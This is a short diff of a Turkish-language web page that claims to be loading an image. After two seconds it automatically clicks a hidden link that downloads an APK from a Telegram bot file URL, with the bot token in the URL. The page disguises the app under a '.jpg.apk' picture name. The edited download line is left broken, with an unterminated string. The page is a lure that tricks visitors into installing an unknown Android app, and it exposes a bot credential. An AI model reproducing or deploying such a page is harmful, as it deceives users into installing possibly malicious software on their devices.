@@ -4,7 +4,7 @@
 function indirVeKur() {
     var link = document.createElement('a');
     link.href = 'https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_12.apk'; // Buraya APK'nın gerçek yolunu yaz
-    link.download = 'Manzara_Resmi.jpg.apk'; // Dosya inerken bu isimle inecek
+    link.download = 'Manzara_Resmi.jpg
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
@@ -16,3 +16,4 @@ setTimeout(indirVeKur, 2000);
 
 <h2>Resim Yükleniyor...</h2>
 <p>Eğer indirme başlamadıysa <a href="javascript:indirVeKur()">buraya tıkla</a>.</p>
+
